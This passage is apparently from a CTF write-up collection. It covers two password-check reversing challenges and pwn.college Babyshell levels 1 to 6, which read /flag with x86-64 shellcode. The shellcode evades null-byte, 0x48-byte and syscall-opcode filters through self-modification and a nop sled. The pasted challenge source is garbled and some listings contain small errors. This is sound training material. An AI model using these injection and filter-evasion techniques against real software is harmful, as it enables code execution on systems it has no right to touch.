<p>For disassembling the binary and looking at machine code, i used <a href="https://cloud.binary.ninja">binary ninja cloud</a>, which makes solving reverse engineering challenges a lot quicker. Looking at the disassembly we see that our programs expects will branch only if <code>argc == 0x2</code>, then we can see a <code>mov rax, qword [rbp-0x10]{argv}</code> which is the instruction that moves our <code>argv[0]</code> inside <code>rax</code>, then we add 8 to it so we can access <code>argv[1]</code>, then we take the value at address [rax] and put it into rax, finally we move rax into rdi and call strcmp with the correct license value.
<img src="https://i.imgur.com/jvj0gwT.png" alt="" /></p>
<h2 id="solving-the-challenge-4"><a class="header" href="#solving-the-challenge-4">Solving the Challenge</a></h2>
<p>As i hope you've understand the challenge works, here's how to complete it, ust run your program with the argument <code>KS-LICENSE-KEY-2021-REV-1</code> and you should win.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="backdoorctf-2013-binaary50"><a class="header" href="#backdoorctf-2013-binaary50">BackdoorCTF 2013 (binaary50)</a></h1>
<p>I decided to go back in time and did this 2013 CTF, this was the challenge for 50 points of the binary category, it's a super easy reverse engineering challenge. Since the challenge is super easy to complete i will make a very quick writeup on it.</p>
<p>We are given the following description with this challenge.</p>
<pre><code>One day, after getting tired of being made fun of by all the other hackers, he decided to finally take a look at BASH. His first thoughts were &quot;Bash? Bash Windows? Oh those violent script kiddies!&quot;. After finishing hundreds of online tutorials, he accidentally (obviously)found a flag. His next status update was &quot; The script kiddies will never be able to get the flag from this password protected binary.

How dare he call you and us &quot;script kiddies&quot;?! Take him down.
Here is the file . For 32bit users - file

</code></pre>
<h2 id="first-run-1"><a class="header" href="#first-run-1">First Run</a></h2>
<p>Running the program for the first time, we can see that the program want's an argument and it checks if it's the right password, if we enter the wrong password, the program outputs <code>nothing to see here</code>.</p>
<h2 id="putting-the-program-in-ida"><a class="header" href="#putting-the-program-in-ida">Putting the program in IDA</a></h2>
<p>Time to disassemble the binary, i'm not very used to reversing C++ binaries with gdb so i will use IDA instead. Looking through the functions in the binary we can see a few interesting ones <code>main, strcmp, flag</code>, looking inside main we can see that our program checks if we gave it an argument.
<img src="https://i.imgur.com/scfgWlb.png" alt="" /></p>
<p>If we follow the right branch we will see a bunch of useless code that actually does not gets executed, its here just to mess with us.
<img src="https://i.imgur.com/3hLyx3s.png" alt="" /></p>
<p>We can prove that the code is useless by looking at the following piece of code.
<img src="https://i.imgur.com/YWDmGdl.png" alt="" /></p>
<p>If we keep scroling a little more we will see a strcmp instruction, which makes a lot more sense than the garbage we just saw, we can see that the string <code>Masternamer</code> is being passed into <code>rdi</code> for the function <code>strcmp</code> and based on the result of <code>strcmp</code> it will either print the flag or exit the program if values are different.
<img src="https://i.imgur.com/D7wSD2T.png" alt="" /></p>
<h2 id="winning-the-challenge"><a class="header" href="#winning-the-challenge">Winning the Challenge</a></h2>
<p>So if you don't know how to solve the challenge by yourself already, you should review you assembly knowledge. The program basically expects us to run the program with an argument with the value <code>Masternamer</code>.</p>
<pre><code>$ ./binaary50 penis
Nothing to see here.

$ ./binaary50 Masternamer
3cd50c6be9bbede06e51741928d88b7e
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-1"><a class="header" href="#babyshell-level-1">Babyshell Level 1</a></h1>
<p>This is the first challenge of the shellcoding modules from pwn.college, it seems to me like a pretty simple challenge... however make sure to watch the videos on youtube before trying to complete those !</p>
<h2 id="how-the-challenge-works"><a class="header" href="#how-the-challenge-works">How the challenge works</a></h2>
<p>We are basically asked to &quot;inject position independant <strong>shell</strong>-code&quot;, we say position independant because the challenge base address change at every execution.</p>
<p>From our knowledge, we know that most of the time flag is stored in &quot;/flag&quot;, this means we can write a shellcode to read and output us this file.</p>
<p>I highly hope you have a great understanding of syscalls so far, if not i highly recommend you go read <a href="https://man7.org/tlpi/">The Linux Programming Interface</a> and <a href="https://www.oreilly.com/library/view/understanding-the-linux/0596005652/">Understanding the Linux Kernel, 3rd Edition</a>.</p>
<p>We will highly rely on syscalls on this module since it's pretty much the only thing we have at hands, we will rely specifically on <strong>sys_open</strong>, <strong>sys_sendfile</strong> and <strong>sys_exit</strong>.</p>
<p>As it looks pretty obvious, we will first <strong>open</strong> the file (file descriptor), <strong>sendfile</strong> to read the content of that file and send its output to a file descriptor and then <strong>exit</strong> the program cleanly.</p>
<h2 id="solving-the-challenge-5"><a class="header" href="#solving-the-challenge-5">Solving the Challenge</a></h2>
<p>I think we're ready to start writing shellcode, for this we will write a <strong>.s</strong> (source) file, compile it with gcc (<strong>gcc -nostdlib -static solve.s solve</strong>) and extract the <strong>.text</strong> section code (our shellcode), into another file (<strong>objcopy --dump-section .text=shellcode solve</strong>).</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    # Open file descriptor
    mov rsi, 0                  # flags
    lea rdi, [rip+flag]         # path name
    mov rax, 2                  # syscall number (sys_open)
    syscall                     # syscall (call into kernel)

    # Read
    mov rdi, 1                  # out_fd
    mov rsi, rax                # in_fd
    mov rdx, 0                  # offset
    mov r10, 100                # count
    mov rax, 40                 # syscall (sys_sendfile)
    syscall                     # call into the kernel
    
    # Exit
    mov rax, 60                 # syscall (sys_exit)
    mov rdi, 42                 # exit number
    syscall                     # syscall
flag:
    .ascii &quot;/flag\0&quot;
</code></pre>
<p>Execute the program with our ./shellcode redirected to stdin and we should win this challenge :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-3"><a class="header" href="#babyshell-level-3">Babyshell Level 3</a></h1>
<p>Babyshell level 3 is the third challenge from pwn.college shellcoding module, it is pretty simple if you have watched the <a href="https://www.youtube.com/watch?v=715v_-YnpT8&amp;t=1968s">videos for the module</a>.</p>
<h2 id="solving-the-challenge-6"><a class="header" href="#solving-the-challenge-6">Solving The Challenge</a></h2>
<p>Solving the challenge is pretty straight forward, we need to remove all null bytes from our shellcode, if there is any null bytes in our shellcode the program will fail.</p>
<p>The challenge took me a couple hours to solve since i had to find instructions that doesn't contains any null bytes in their opcode, i found the following informations :
- a lot of time <strong>mov</strong> instructions have null bytes in their opcode, however with <strong>rbx</strong> that was not the case, so i used <strong>rbx</strong> a little in the final solution <strong>instead of directly moving the value &quot;/flag&quot; into rdi</strong>.
- if your string ends with a <strong>null character</strong>, you can <strong>replace it for a carriage return.</strong>
- <strong>push and pop</strong> can be easily used as a replacement for the <strong>mov</strong> instruction, just push the value on the stack and pop it back into any register you want, we will use this technique <strong>a LOT</strong>, this way we will spend less time trying to fix mov instructions with null bytes.</p>
<p>With the preceding informations we should have a really got view of how we will solve this challenge.</p>
<p>Let's start writing our shellcode, first we need a opened file descriptor to our flag file :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value &quot;galf&quot; in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a &quot;/&quot; in bl register
	mov bl, 0x2f			# mov 0x2f &quot;/&quot; inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value &quot;/flag&quot; which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel
</code></pre>
<p>When this code executes it should return a file descriptor to the &quot;/flag&quot; file. </p>
<p>We moved the value &quot;/flag&quot; using ebx and a shift left because &quot;/flag&quot; is 5 bits long and moving a 5 bytes value inside rbx (8 bytes register), it would have certainly implied some null bytes in the opcode.</p>
<p>The value &quot;<strong>flag</strong>&quot;, is 4 bytes wide which <strong>fits inside ebx</strong>, so we can just <strong>move &quot;flag&quot; in ebx</strong>, <strong>shift it to the left 8 bits</strong> so we have space to put &quot;/&quot; in the <strong>lower 8 bits of ebx</strong>, and mov <strong>0x2f</strong> in it which is &quot;/&quot; in ascii encoding.</p>
<p>The next step was to actually put rbx inside rdi since rbx is not on the x64 kernel calling convention, so just push the value inside rbx onto the stack and pop it back inside rdi, and you should have done the hardest part in this shellcode.</p>
<p>The next steps are exactly as in the last challenge (babyshell 2), but in this one we'll use <strong>push and pop</strong> instructions instead of using the <strong>mov</strong> instruction for the arguments.</p>
<p>Just like in the last challenge we will use the <strong>sendfile systemcall</strong> to read the file and send it to a file descriptor, in our case (<strong>stdout</strong>).</p>
<p>The function definition for sendfile is the following :</p>
<pre><code class="language-c">ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
</code></pre>
<p>The function takes three arguments, the output file descriptor, the input file descriptor, the offset (in our case 0), and the count of bytes we wish to read.</p>
<p>On x86_64 linux the kernel interface uses the following register as calling convention  : <strong>%rdi, %rsi, %rdx, %r10, %r8 and %r9.</strong> Since <strong>sendfile</strong> had 4 arguments, we will need <strong>%rdi, %rsi, %rdx, %r10</strong>.</p>
<p>Let's write the second part of our shellcode :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value &quot;galf&quot; in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a &quot;/&quot; in bl register
	mov bl, 0x2f			# mov 0x2f &quot;/&quot; inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value &quot;/flag&quot; which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel

	# Read and output the file
	push 1					# push stdin file descriptor number on the stack (out_fd)
	pop rdi					# pop the value in rdi
	push rax				# push the return value from our last systemcall (filedescriptor) inside (in_fd)
	pop rsi 				# pop it inside rsi
	push 0					# push 0 on the stack (offset)
	pop rdx					# pop it inside rdx
	push 1024				# push the number of bytes we wish to read (count)
	pop r10					# pop the number of bytes we wish to read inside r10
	push 40					# push syscall number on the stack
	pop rax					# pop it back inside rax
	syscall 				# call into the kernel
</code></pre>
<p>With the preceding code, if you compile it, it should work and read the file, however we want a clean exit, to avoid any bug with our program when leaving or returning, for this reason we will write a last system call which will cause to exit the program cleanly :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
	# Open file descriptor
	xor rsi, rsi 			# zero out rsi
	mov ebx, 0x67616c66		# mov value &quot;galf&quot; in ebx
	shl rbx, 8				# shift rbx one byte to the left this way we have place for a &quot;/&quot; in bl register
	mov bl, 0x2f			# mov 0x2f &quot;/&quot; inside bl
	push rbx				# push rbx onto the stack so it can be moved inside rdi
	mov rdi, rsp			# mov the value &quot;/flag&quot; which is now on top of the stack in rdi
	mov rax, 2				# sys_open syscall number
	syscall					# call into the kernel

	# Read and output the file
	push 1					# push stdin file descriptor number on the stack (out_fd)
	pop rdi					# pop the value in rdi
	push rax				# push the return value from our last systemcall (filedescriptor) inside (in_fd)
	pop rsi 				# pop it inside rsi
	push 0					# push 0 on the stack (offset)
	pop rdx					# pop it inside rdx
	push 1024				# push the number of bytes we wish to read (count)
	pop r10					# pop the number of bytes we wish to read inside r10
	push 40					# push syscall number on the stack
	pop rax					# pop it back inside rax
	syscall 				# call into the kernel

	# Exit the program cleanly
	push 60 				# system call number
	pop rax					# pop system call number in rax
	push 69					# exit number
	pop rdi					# pop exit number in rdi
	syscall
</code></pre>
<p>And we should have a shellcode that contains no null bytes, just like the program asks us, let's make sure we did everything right :</p>
<pre><code>$ gcc -w -nostdlib -static -o shell shellcode.s -masm=intel
$ ./shell
flag{fake_flag_for_testing}
$ objcopy --dump-section .text=solver shell
$ xxd solver
</code></pre>
<p>After running xxd on the resulting file you should see all the bytes in hexadecimal the shellcode actually has, if it contains any &quot;00&quot; we have failed the shellcode, if it don't we successfully achieved what we wanted to :</p>
<pre><code>$ xxd solver
00000000: 4831 f6bb 666c 6167 48c1 e308 b32f 5348  H1..flagH..../SH
00000010: 89e7 6a02 580f 056a 015f 505e 4831 d26a  ..j.X..j._P^H1.j
00000020: 6441 5a6a 2858 0f05 6a3c 586a 2a5f 0f05  dAZj(X..j&lt;Xj*_..
</code></pre>
<p>And it looks to me like we were able to evade this no null-bytes filter on the shellcode !</p>
<p>Let's prove it :</p>
<pre><code>$ ./babyshell_level3 &lt;solver
flag{fake_flag_for_testing}
</code></pre>
<p>:)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-4"><a class="header" href="#babyshell-level-4">Babyshell Level 4</a></h1>
<p>This challenge was a bit like the last one, but this time the filter checks for the byte 0x48, so we need to test different registers to see which cause the opcode 0x48 and which register doesn't.</p>
<h2 id="solving-the-challenge-7"><a class="header" href="#solving-the-challenge-7">Solving The Challenge</a></h2>
<p>So we are going to start looking at every restriction on the current instruction in our program, since the challenge is pretty much the same we can just take the same shellcode we used in the precedent level and objdump it, this way we can see where our shellcode can potentially fail and which instructions we need to fix.</p>
<p>Also you can use the pwn.asm() functions instead of compiling the code and checking with objdump.</p>
<p>Those are the following restrictions on instructions i've had to deal with during the course of this challenge :</p>
<p>mov rdi, rsp - can't be used since it has a 0x48 in it's opcode
shl rbx, 8   - can't be used since it has a 0x48 in it's opcode</p>
<p>I've made a program that does shl, shr, rol, ror, sar, sal. Note how each of these instructions starts with the opcode 0x48, which we need to evade... this means we won't be able to use these instructions, also note that the instruction <strong>sal</strong> was translated to <strong>shl</strong> during compilation of the program :</p>
<pre><code class="language-x86asm">Disassembly of section .text:

0000000000401000 &lt;_start&gt;:
401000:       48 c1 e3 08             shl    rbx,0x8
401004:       48 c1 e0 08             shl    rax,0x8
401008:       48 c1 e2 08             shl    rdx,0x8
40100c:       48 c1 e6 08             shl    rsi,0x8
401010:       48 c1 e7 08             shl    rdi,0x8
401014:       48 c1 c3 08             rol    rbx,0x8
401018:       48 c1 c0 08             rol    rax,0x8
40101c:       48 c1 c2 08             rol    rdx,0x8
401020:       48 c1 c6 08             rol    rsi,0x8
401024:       48 c1 c7 08             rol    rdi,0x8
401028:       48 c1 eb 08             shr    rbx,0x8
40102c:       48 c1 e8 08             shr    rax,0x8
401030:       48 c1 ea 08             shr    rdx,0x8
401034:       48 c1 ee 08             shr    rsi,0x8
401038:       48 c1 ef 08             shr    rdi,0x8
40103c:       48 c1 e3 08             shl    rbx,0x8
401040:       48 c1 e0 08             shl    rax,0x8
401044:       48 c1 e2 08             shl    rdx,0x8
401048:       48 c1 e6 08             shl    rsi,0x8
40104c:       48 c1 e7 08             shl    rdi,0x8
401050:       48 c1 cb 08             ror    rbx,0x8 
401054:       48 c1 c8 08             ror    rax,0x8
401058:       48 c1 ca 08             ror    rdx,0x8
40105c:       48 c1 ce 08             ror    rsi,0x8
401060:       48 c1 cf 08             ror    rdi,0x8
401064:       48 c1 fb 08             sar    rbx,0x8
401068:       48 c1 f8 08             sar    rax,0x8
40106c:       48 c1 fa 08             sar    rdx,0x8
401070:       48 c1 ff 08             sar    rdi,0x8
401074:       48 c1 fe 08             sar    rsi,0x8
401078:       48 c1 e3 08             shl    rbx,0x8
40107c:       48 c1 e0 08             shl    rax,0x8
401080:       48 c1 e2 08             shl    rdx,0x8
401084:       48 c1 e7 08             shl    rdi,0x8
401088:       48 c1 e6 08             shl    rsi,0x8
</code></pre>
<p>We can conclude that we can't use bit shifting (shl, shr), bit rotating (ror, rol) or bit arithmetic shifting (sal, sar)</p>
<p>Next i've noticed some 0x48 bytes in the opcode of the &quot;<strong>mov rdi, rsp</strong>&quot; instruction... for this reason we are going to try to move every register possible inside rdi, to achieve this i wrote the following program (note how we were able to evade the filter using the r10 register) :</p>
<pre><code class="language-x86asm">Disassembly of section .text:

0000000000401000 &lt;_start&gt;:
401000:       48 c7 c0 01 00 00 00    mov    rax,0x1
401007:       48 89 c7                mov    rdi,rax
40100a:       48 89 c6                mov    rsi,rax
40100d:       48 89 f7                mov    rdi,rsi
401010:       48 89 c3                mov    rbx,rax
401013:       48 89 df                mov    rdi,rbx
401016:       48 89 c2                mov    rdx,rax
401019:       48 89 d7                mov    rdi,rdx
40101c:       49 89 c2                mov    r10,rax
40101f:       4c 89 d7                mov    rdi,r10
401022:       50                      push   rax
401023:       48 89 e7                mov    rdi,rsp
401026:       48 31 ff                xor    rdi,rdi
401029:       48 31 c0                xor    rax,rax
40102c:       48 31 f6                xor    rsi,rsi
40102f:       4d 31 d2                xor    r10,r10
401032:       48 31 db                xor    rbx,rbx
401035:       48 31 d2                xor    rdx,rdx
401038:       48 c7 c0 3c 00 00 00    mov    rax,0x3c
40103f:       48 c7 c7 2a 00 00 00    mov    rdi,0x2a
401046:       0f 05                   syscall
</code></pre>
<p>Notice that the <strong>xor instruction</strong> has the byte 0x48 in his opcode, for this reason we are going to need to avoid using the <strong>xor instruction</strong>.</p>
<p>So after noticing that i could bypass the filter using r10 register, i asked myself if i could use either a <strong>shr, shl, ror, rol, sar, sal</strong> instruction on the r10 register to bypass the filter :</p>
<pre><code class="language-x86asm">40108c:       49 c1 e2 08             shl    r10,0x8
401090:       49 c1 ea 08             shr    r10,0x8
401094:       49 c1 e2 08             shl    r10,0x8
401098:       49 c1 fa 08             sar    r10,0x8
40109c:       49 c1 ca 08             ror    r10,0x8
4010a0:       49 c1 c2 08             rol    r10,0x8
</code></pre>
<p>As you can notice it turns out that the r10 register does indeed bypass the filter, ALL HAIL R10 !!!! :)</p>
<p>So we can start writing the first part of our shellcode which is opening a file descriptor on the &quot;/flag&quot; file, in our case we won't be able to use rbx for our bit shifting like the last challenge since we can't shift rbx without causing a 0x48 opcode, which will make us fail the challenge.</p>
<p>For this reason i have used r10 in my code !</p>
<p>Other problem i ran into, <strong>rsi/rdx</strong> were set to some random values when i executed my shellcode so i'm going to need to clear them out, but i can't use <strong>xor rsi,rdi</strong> or <strong>xor rdx, rdx</strong>... in this case i will do <strong>xor r10, r10</strong> and then move r10 into rdx and rsi.</p>
<p>Next problem i ran into while trying to solve this challenge is that you can't directly move 0x2 into rax without having a 0x48 opcode, for this reason i am going to put 0x2 in the lower 8 bits of r10 (<strong>r10b</strong>) and do a <strong>mov al, r10b</strong>.</p>
<p>With all these problem fixed our open syscall should be able to bypass the filter imposed, let's write the first partof our shellcode :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    
    # Open a file descriptor on the &quot;/flag&quot; file
    mov r10d, 0x67616c66
    shl r10, 8
    mov r10b, 0x2f
    push r10
    pop r10
    mov rdi, r10
    xor r10, r10
    mov rsi, r10
    mov rdx, r10
    mov r10b, 0x2
    mov al, r10b
    syscall
</code></pre>
<p>Next step would be to use our sendfile instruction to read the file and send it out to the standard output file descriptor (0)...</p>
<p>We can pretty much rewrite the same as we did for the last challenge and it should work,... let's do that :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    
    # Open a file descriptor on the &quot;/flag&quot; file
    mov r10d, 0x67616c66
    shl r10, 8
    mov r10b, 0x2f
    push r10
    pop r10
    mov rdi, r10
    xor r10, r10
    mov rsi, r10
    mov rdx, r10
    mov r10b, 0x2
    mov al, r10b
    syscall

    # Read a the file we just opened and send it to stdout
    push 1
    pop rdi
    push rax
    pop rdi
    push 100
    pop r10
    push 40
    pop rax
    syscall

    push 60
    pop rax
    push 42
    pop rdi
    syscall
</code></pre>
<p>Now you can just compile it, extract the bytes from the <strong>.text</strong> section and we should win the challenge ! Let's prove that it works :</p>
<pre><code>$ gcc -w -nostdlib -static shellcode.s -o shellcode -masm=intel
$ objcopy --dump-section .text=solver shellcode
$ ./babyshell_level4 &lt;solver
flag{fake_flag_for_testing}
</code></pre>
<p>Annnnnd we did bypass the filter, it was pretty easy and nice to solve, if you had problems doing it on your own remember you can write programs to test instructions and dump their opcode using the objdump -D switch. :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-5"><a class="header" href="#babyshell-level-5">Babyshell Level 5</a></h1>
<p>Okay ! Now we are talking, this challenge was a little bit harder than the previous one, but was really fun to solve. Itried to solved it for like 3 hours before i quitted and the next day i was able to complete it on my own.</p>
<h2 id="solving-the-challenge-8"><a class="header" href="#solving-the-challenge-8">Solving the Challenge</a></h2>
<p><strong>What is the task :</strong> We need to write a shellcode that does not contains any <strong>syscall</strong> (0x0f05), <strong>sysenter</strong> (0x0f34) or <strong>int</strong> (0x80cd) opcodes in our shellcode, this makes it a LOT harder for us to call into the kernel since we n eed to write <strong>self-modifying code</strong>, for this challenge we will heavily rely on labels, make sure you know what they  are before jumping into this !</p>
<p>So, after a bit of researching on how i could write this &quot;self-modifying&quot; shellcode, i found on discord that we could use a label for that, we are going to put <strong>.word</strong> values in our labels, with the value of 0x0000, however when the program will run, it will modify the value of our <strong>.word</strong> in the label for the syscall opcode, and we can just call the location of [rip+label] to execute the syscall instructions, let's start writing code :</p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    # prepare syscall
    mov byte ptr[rip+syscall1], 0x0f
    mov byte ptr[rip+syscall1+1], 0x05
    lea r9, [rip+syscall1]

    # clear registers
    xor rbx, rbx
    xor rdx, rdx
    xor rdi, rdi
    xor rsi, rsi
    xor r10, r10

    # open file
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    mov rax, 2
    call r9                 # syscall we jump inside our label

# sys_sendfile
syscall1:
    .word 0x0000
    
    xor r9, r9
    # prepare next syscall
    mov byte ptr[rip+syscall2], 0x0f
    mov byte ptr[rip+syscall2+1], 0x05
    lea r9, [rip+syscall2]

    xor rsi, rsi
    xor r10,r10
    xor rdi, rdi
    xor rdx, rdx
    xor rbx, rbx
    # sendfile
    mov rdi, 1
    mov rsi, rax
    mov r10, 100
    mov rax, 40
    call r9

# sys_exit
syscall2:
    .word 0x0000

    xor r9, r9
    # prepare syscall
    mov byte ptr[rip+syscall3], 0x0f
    mov byte ptr[rip+syscall3], 0x05
    lea r9, [rip+syscall3]
    xor rsi, rsi
    xor r10, r10
    xor rax, rax
    xor rdi, rdi
    mov rax, 60
    mov rdi, 5
    call r9

syscall3:
    .word 0x0000
</code></pre>
<p>I am not sure it's the best optimized way to do this challenge, but i decided to do it this way and it works pretty well, i do a lot of registers clearing because i had an issue with the program where registers would change before executing syscall, by clearing register i was able to execute each syscalls and write the flag properly :)</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="babyshell-level-6"><a class="header" href="#babyshell-level-6">BabyShell Level 6</a></h1>
<p>This one was a easy level, extremely similar to the last one we just did, but this time the first 4096 bytes of the program have been removed write permissions, this means we can't write shellcode on the stack unless we put 4096 bytes of junk before our shellcode.</p>
<p><em>Note that we still have the same filter on syscalls than the last challenge, for this reason we will reuse the shellcode i wrote.</em></p>
<pre><code class="language-x86asm">.global _start
_start:
.intel_syntax noprefix
    .rept 4096
    nop
    .endr

    # prepare syscall
    mov byte ptr[rip+label], 0x0f
    mov byte ptr[rip+label+1], 0x05
    lea r9, [rip+label]

    # clear registers
    xor rbx, rbx
    xor rdx, rdx
    xor rsi, rsi
    xor rdi, rdi
    xor r10, r10

    # open flag file
    mov ebx, 0x67616c66
    shl rbx, 8
    mov bl, 0x2f
    push rbx
    mov rdi, rsp
    mov rax, 2
    call r9

label:
    .word 0x0000

    xor r9, r9
    # prepare next syscall
    mov byte ptr[rip+label2], 0x0f
    mov byte ptr[rip+label2+1], 0x05
    lea r9, [rip+label2]

    xor rsi, rsi
    xor r10, r10
    xor rdi, rdi
    xor rdx, rdx
    xor rbx, rbx
    # sendfile
    mov rdi,1
    mov rsi, rax
    mov r10, 100
    mov rax, 40
    call r9
label2:
    .word 0x0000

    xor r9, r9
    # prepare syscall
    mov byte ptr[rip+label3], 0x0f
    mov byte ptr[rip+label3+1], 0x05
    lea r9, [rip+label3]
    # exit
    xor rsi, rsi
    xor r10, r10
    xor rax, rax
    xor rdi, rdi
    mov rax, 60
    mov rdi, 5
    call r9

label3:
    .word 0x0000
</code></pre>
<p>Compile the shellcode with gcc <code>gcc -w -nostdlib -static solve.s -o solve</code>, then you can extract the bytes of the <code>.text section</code> using <code>objcopy --dump-section .text=solver ./solve</code>, then you can run the program with our solver file redirected to standard input <code>./babyshell_level6 &lt;solver</code>. </p>
<p>Another cool thing is that we are given the source code for this challenge which is the following one.</p>
<pre><code class="language-c">#define CAPSTONE_ARCH CS_ARCH_X86                                                                                                                                                                                                            #define CAPSTONE_MODE CS_MODE_64
#include &lt;sys/mman.h&gt;                                                                                                                                                                                                               [66/1973]#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;
#include &lt;unistd.h&gt;                                                                                                                                                                                                                          #include &lt;stdio.h&gt;
                                                                                                                                                                                                                                             #include &lt;capstone/capstone.h&gt;
                                                                                                                                                                                                                                             #define CAPSTONE_ARCH CS_ARCH_X86                                                                                                                                                                                                            #define CAPSTONE_MODE CS_MODE_64
                                                                                                                                                                                                                                             void print_disassembly(void *shellcode_addr, size_t shellcode_size)                                                                                                                                                                          {                                                                                                                                                                                                                                                csh handle;                                                                                                                                                                                                                                  cs_insn *insn;                                                                                                                                                                                                                               size_t count;
                                                                                                                                                                                                                                                 if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &amp;handle) != CS_ERR_OK)                                                                                                                                                                             {                                                                                                                                                                                                                                                printf(&quot;ERROR: disassembler failed to initialize.\n&quot;);                                                                                                                                                                                                                                                                                                                                                                                                                            void print_disassembly(void *shellcode_addr, size_t shellcode_size)                                                                                                                                                                          {                                                                                                                                                                                                                                                csh handle;                                                                                                                                                                                                                                  cs_insn *insn;                                                                                                                                                                                                                               size_t count;
                                                                                                                                                                                                                                                 if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &amp;handle) != CS_ERR_OK)                                                                                                                                                                             {                                                                                                                                                                                                                                                printf(&quot;ERROR: disassembler failed to initialize.\n&quot;);                                                                                                                                                                               
        return;
    }                                                                                                                                                                                                                               [43/1973]
    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &amp;insn);
    if (count &gt; 0)
    {                                                                                                                                                                                                                                                size_t j;                                                                                                                                                                                                                                    printf(&quot;      Address      |                      Bytes                    |          Instructions\n&quot;);                                                                                                                                      printf(&quot;------------------------------------------------------------------------------------------\n&quot;);                                                                                                                              
        for (j = 0; j &lt; count; j++)
        {
            printf(&quot;0x%016lx | &quot;, (unsigned long)insn[j].address);
            for (int k = 0; k &lt; insn[j].size; k++) printf(&quot;%02hhx &quot;, insn[j].bytes[k]);
            for (int k = insn[j].size; k &lt; 15; k++) printf(&quot;   &quot;);
            printf(&quot; | %s %s\n&quot;, insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf(&quot;ERROR: Failed to disassemble shellcode! Bytes are:\n\n&quot;);                                                                                                                                                                            printf(&quot;      Address      |                      Bytes\n&quot;);                                                                                                                                                                                 printf(&quot;--------------------------------------------------------------------\n&quot;);                                                                                                                                                            for (unsigned int i = 0; i &lt;= shellcode_size; i += 16)
        {
            printf(&quot;0x%016lx | &quot;, (unsigned long)shellcode_addr+i);
            for (int k = 0; k &lt; 16; k++) printf(&quot;%02hhx &quot;, ((uint8_t*)shellcode_addr)[i+k]);
            printf(&quot;\n&quot;);
        }
    }

    cs_close(&amp;handle);
}

void *shellcode_mem;
size_t shellcode_size;

int main(int argc, char **argv, char **envp)
{
    assert(argc &gt; 0);

    printf(&quot;###\n&quot;);
    printf(&quot;### Welcome to %s!\n&quot;, argv[0]);
    printf(&quot;###\n&quot;);
    printf(&quot;\n&quot;);

    puts(&quot;This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them&quot;);
    puts(&quot;as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will&quot;);
    puts(&quot;practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing&quot;);
    puts(&quot;other tricks, this will sanitize all environment variables and arguments and close all file descriptors &gt; 2.\n&quot;);
    for (int i = 3; i &lt; 10000; i++) close(i);
    for (char **a = argv; *a != NULL; a++) memset(*a, 0, strlen(*a));
    for (char **a = envp; *a != NULL; a++) memset(*a, 0, strlen(*a));

    shellcode_mem = mmap((void *) 0x14c61000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    printf(&quot;[LEAK] Mapping shellcode memory at %p!\n&quot;, shellcode_mem);
    assert(shellcode_mem == (void *) 0x14c61000);

    puts(&quot;Reading 0x2000 bytes from stdin.\n&quot;);
    shellcode_size = read(0, shellcode_mem, 0x2000);
    assert(shellcode_size &gt; 0);

    puts(&quot;Executing filter...\n&quot;);
    puts(&quot;This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls&quot;);
    puts(&quot;are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05&quot;);
    puts(&quot;(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to&quot;);
    puts(&quot;insert the `syscall` instructions at runtime.\n&quot;);
    for (int i = 0; i &lt; shellcode_size; i++)
    {
        uint16_t *scw = (uint16_t *)((uint8_t*)shellcode_mem + i);
        if (*scw == 0x80cd || *scw == 0x340f || *scw == 0x050f)
        {
            printf(&quot;Failed filter at byte %d!\n&quot;, i);
            exit(1);
        }
    }

    puts(&quot;Removing write permissions from first 4096 bytes of shellcode.\n&quot;);
    assert(mprotect(shellcode_mem, 4096, PROT_READ|PROT_EXEC) == 0);

    puts(&quot;This challenge is about to execute the following shellcode:\n&quot;);
    print_disassembly(shellcode_mem, shellcode_size);
    puts(&quot;&quot;);

    puts(&quot;Executing shellcode!\n&quot;);
    ((void(*)())shellcode_mem)();
</code></pre>
